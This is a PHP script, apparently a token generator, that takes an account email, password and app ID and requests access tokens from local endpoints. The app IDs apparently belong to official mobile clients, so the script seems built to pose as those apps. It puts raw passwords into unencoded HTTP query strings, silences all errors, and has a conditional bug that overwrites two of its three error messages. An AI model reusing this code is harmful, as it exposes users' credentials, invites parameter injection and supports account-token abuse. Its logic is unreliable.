<?php

error_reporting(0);

$user_agent = urlencode ($_SERVER['HTTP_USER_AGENT']);

if(isset($_POST['email']) && isset($_POST['password']) && isset($_POST['app_id']))
{
$email = trim($_POST['email']);
$pass = trim($_POST['password']);
$app_id = trim($_POST['app_id']);

if($app_id == 350685531728)
{
$token = json_decode(file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/token/android.php?u='.$email.'&p='.$pass.'&ua='.$user_agent.''),true);

if($token['error_code'] == 100)
{
$access_token=('email atau kata sandi belum dimasukkan');
}

if($token['error_code'] == 401)
{
$access_token=('email atau kata sandi salah');
}

if($token['error_code'] == 613)
{
$access_token=('server down, silahkan ulangi beberapa saat lagi');
}
else
{
$access_token=($token);
}

}



elseif($app_id == 165907476854626)
{
$token = json_decode(file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/token/ios.php?u='.$email.'&p='.$pass.''),true);

if($token['error_code'] == 100)
{
$access_token=('email atau kata sandi belum dimasukkan');
}
if($token['error_code'] == 401)
{
$access_token=('email atau kata sandi salah');
}
if($token['error_code'] == 613)
{
$access_token=('server down, silahkan ulangi beberapa saat lagi');
}
else
{
$access_token=($token);
}

}



elseif($app_id == 6628568379)
{
$token = json_decode(file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/token/iphone.php?u='.$email.'&p='.$pass.'&ua='.$user_agent.''),true);

if($token['error_code'] == 100)
{
$access_token=('email atau kata sandi belum dimasukkan');
}
if($token['error_code'] == 401)
{
$access_token=('email atau kata sandi salah');
}
if($token['error_code'] == 613)
{
$access_token=('server down, silahkan ulangi beberapa saat lagi');
}
else
{
$access_token=($token);
}

}



}


?>
